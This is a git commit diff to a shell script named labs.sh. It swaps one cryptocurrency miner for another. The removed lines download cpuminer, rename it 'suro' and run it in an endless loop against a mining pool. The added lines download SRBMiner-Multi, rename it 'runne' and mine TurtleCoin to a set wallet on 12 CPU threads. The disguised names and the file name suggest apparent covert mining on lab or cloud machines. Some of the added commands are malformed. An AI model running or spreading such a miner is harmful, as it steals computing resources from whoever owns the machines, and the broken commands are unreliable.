2d343901ec396075ee8ba94dc1b79602c4819ada
remakove <78358369+remakove@users.noreply.github.com>
2021-06-20 19:15:55 +0700

    Update labs.sh

--- labs.sh
+++ labs.sh
@@ -8,12 +8,8 @@
 #
 #MBC
 sudo apt update
-sudo apt install cpulimit
-cpulimit -P cpuminer-sse2 -l 154 -b
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-mv cpuminer-sse2 suro
-while [ 1 ]; do
-./suro -a power2b -o stratum+tcp://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.lala -t1
-sleep 3
-done
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner-Multi-0-7-6-Linux.tar.xz
+tar tar -xvf SRBMiner-Multi-0-7-6-Linux.tar.xz
+cd SRBMiner-Multi-0-7-6
+mv SRBMiner-MULTI runne
+./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.p5 --disable-gpu --cpu-threads 12
